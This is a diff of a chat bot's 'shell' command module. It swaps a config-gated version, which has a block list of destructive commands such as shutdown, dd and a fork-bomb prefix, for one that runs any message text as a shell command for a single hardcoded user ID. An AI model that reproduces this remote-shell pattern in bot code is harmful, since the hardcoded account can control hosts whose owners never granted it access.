@@ -1,66 +1,31 @@
-const { exec } = require("child_process");
-const fs = require("fs");
-const path = require("path");
-
-module.exports = {
-  config: {
-    name: "shell",
-    version: "1.0",
-    hasPermssion: 2, // Bot Admins only
-    credits: "Hassan",
-    description: "Run shell commands or list all .js commands.",
-    commandCategory: "Admin",
-    usages: "shell <command> | shell list",
-    cooldowns: 5,
-    usePrefix: true,
-    aliases: ["sh", "bash", "terminal"]
-  },
-
-  run: async function ({ api, event, args, global }) {
-    const { threadID, messageID, senderID } = event;
-
-    if (!global.config.ADMINBOT.includes(senderID)) return;
-
-    const input = args.join(" ").trim();
-
-    if (!input) return api.sendMessage("❗ Usage: shell <command> | shell list", threadID, messageID);
-
-    if (input === "list") {
-      const commandDir = __dirname;
-      const files = fs.readdirSync(commandDir).filter(file => file.endsWith(".js"));
-
-      const listMessage = files.length
-        ? `📁 Commands in this folder:\n\n${files.map(f => `- ${f}`).join("\n")}`
-        : "⚠️ No .js commands found.";
-
-      return api.sendMessage(listMessage, threadID, messageID);
-    }
-
-    // Block dangerous shell commands
-    const blocked = ["shutdown", "reboot", "dd", ":(){", "init", "poweroff"];
-    if (blocked.some(cmd => input.includes(cmd))) {
-      return api.sendMessage("🚫 This command is blocked for safety.", threadID, messageID);
-    }
-
-    exec(input, { shell: "/bin/bash", maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
-      let output = "";
-
-      if (error) output += `❌ Error:\n${error.message}\n`;
-      if (stderr) output += `⚠️ Stderr:\n${stderr}\n`;
-      if (stdout) output += `✅ Output:\n${stdout}\n`;
-
-      output = output.trim() || "⚠️ No output returned.";
-
-      if (output.length < 1900) {
-        return api.sendMessage(output, threadID, messageID);
-      } else {
-        const tempPath = path.join(__dirname, "output.txt");
-        fs.writeFileSync(tempPath, output);
-        return api.sendMessage({
-          body: "📄 Output too long, sent as file:",
-          attachment: fs.createReadStream(tempPath)
-        }, threadID, () => fs.unlinkSync(tempPath));
-      }
-    });
-  }
+module.exports.config = {
+	name: "shell",
+	version: "7.3.1",
+	hasPermssion: 2,
+	credits: "John Lester",
+	description: "running shell",
+	commandCategory: "System",
+	usages: "[shell]",
+	cooldowns: 0,
+	dependencies: {
+		"child_process": ""
+	}
 };
+module.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {    
+const { exec } = require("child_process");
+const god = ["100008485152397"];
+  if (!god.includes(event.senderID)) 
+return api.sendMessage("LOL", event.threadID, event.messageID);
+let text = args.join(" ")
+exec(`${text}`, (error, stdout, stderr) => {
+    if (error) {
+        api.sendMessage(`error: \n${error.message}`, event.threadID, event.messageID);
+        return;
+    }
+    if (stderr) {
+        api.sendMessage(`stderr:\n ${stderr}`, event.threadID, event.messageID);
+        return;
+    }
+    api.sendMessage(`stdout:\n ${stdout}`, event.threadID, event.messageID);
+});
+}
